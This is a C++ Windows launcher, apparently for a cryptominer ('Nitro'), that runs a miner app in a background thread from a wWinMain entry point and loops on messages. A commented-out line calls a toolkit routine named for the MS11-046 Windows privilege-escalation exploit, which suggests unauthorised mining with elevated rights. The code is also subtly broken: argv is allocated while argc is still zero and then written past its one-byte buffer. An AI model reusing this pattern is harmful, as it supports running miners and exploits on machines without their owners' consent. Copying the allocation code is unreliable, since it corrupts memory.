// NitroMain.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "module.h"

//////////////////////////////////////////////////////////////
BOOL StartMiner(App& minerApp); //启动miner
VOID argvW2A(char **argv, LPWSTR *argvW, int argc); //参数字节转换

//BOOL StartMiner(int argc, char **argv); //启动miner

////////////////////////////////////////////////////////////
DWORD WINAPI myFunc(LPVOID lpParam)
{  
	App* mapp = (App*)lpParam;
	printf("exec\r\n");
	mapp->exec();
	return 0;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,	_In_opt_ HINSTANCE hPrevInstance,
					_In_ LPWSTR    lpCmdLine,	_In_ int nCmdShow)
{
	LPWSTR *argvW;
	int argc = 0;

	char **argv = (char**)malloc(argc * sizeof(char *) + 1);
	argvW = CommandLineToArgvW(GetCommandLine(), &argc);
	argvW2A(argv, argvW, argc);
	
	App minerApp(argc, argv);
	StartMiner(minerApp);

	////CToolKit kit;
	////kit.execExp(CToolKit::EXP_MS_11046);

	//SysConfig();


	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return msg.wParam;
}


//创建miner线程
BOOL StartMiner(App& minerApp)
{


	DWORD threadID;

	HANDLE hThread = CreateThread(NULL, // default security attributes
		0, // use default stack size
		myFunc, // thread function
		&minerApp, // argument to thread function
		0, // use default creation flags	
		&threadID); // returns the thread identifier

	if (hThread == NULL)
	{
		MessageBox(NULL, L"Create Thread Failed!", L"warning", MB_OK);
		ExitProcess(-1);
	}
	
	//防止miner被函数结束而释放
	Sleep(500);
	
	return TRUE;
}

VOID argvW2A(char **argv, LPWSTR *argvW, int argc)
{
	memset(argv, 0, argc * sizeof(char *) + 1);

	for (int i = 0; i < argc; i++)
	{
		MessageBox(NULL, argvW[i], L"Arglist contents", MB_OK);
		USES_CONVERSION;
		argv[i] = W2A(argvW[i]);
		MessageBoxA(NULL, argv[i], "Arglist contents", MB_OK);
	}
}